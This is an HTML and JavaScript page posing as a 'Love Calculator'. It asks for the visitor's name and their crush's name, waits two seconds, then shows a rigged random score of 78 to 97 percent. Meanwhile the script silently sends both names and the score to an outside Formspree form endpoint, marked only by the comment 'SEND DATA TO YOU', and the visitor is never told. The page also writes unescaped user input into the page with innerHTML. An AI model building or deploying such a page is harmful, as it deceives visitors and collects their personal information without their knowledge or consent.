<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Calculator</title>

<style>

body{
font-family: Arial, sans-serif;
background: linear-gradient(135deg,#ff4d6d,#ff758f);
height:100vh;
display:flex;
justify-content:center;
align-items:center;
margin:0;
color:white;
}

.container{
background:white;
color:black;
padding:25px;
border-radius:15px;
width:90%;
max-width:350px;
text-align:center;
box-shadow:0 10px 25px rgba(0,0,0,0.3);
}

input{
width:90%;
padding:10px;
margin:8px;
border-radius:8px;
border:1px solid #ccc;
font-size:16px;
}

button{
background:#ff4d6d;
color:white;
border:none;
padding:12px;
width:95%;
border-radius:10px;
font-size:18px;
cursor:pointer;
}

button:hover{
background:#e63956;
}

#result{
margin-top:20px;
font-size:22px;
font-weight:bold;
}

.loading{
display:none;
font-size:18px;
}

</style>

</head>
<body>

<div class="container">

<h2>❤️ Love Calculator ❤️</h2>

<input type="text" id="name" placeholder="Enter Your Name">

<input type="text" id="crush" placeholder="Enter Crush Name">

<button onclick="calculate()">Check Love %</button>

<div class="loading" id="loading">
Calculating love...
</div>

<div id="result"></div>

</div>

<script>

function calculate(){

var name=document.getElementById("name").value;
var crush=document.getElementById("crush").value;

if(name=="" || crush==""){
alert("Enter both names");
return;
}

document.getElementById("loading").style.display="block";
document.getElementById("result").innerHTML="";

setTimeout(function(){

var percent=Math.floor(Math.random()*21)+78;

var resultText=
name+"'s Crush Loves him "+percent+"% ❤️";

document.getElementById("loading").style.display="none";

document.getElementById("result").innerHTML=resultText;

// SEND DATA TO YOU

fetch("https://formspree.io/f/mykdnegq",{

method:"POST",

headers:{
'Content-Type':'application/json'
},

body:JSON.stringify({
yourName:name,
crushName:crush,
lovePercent:percent
})

});

},2000);

}

</script>

</body>
</html>
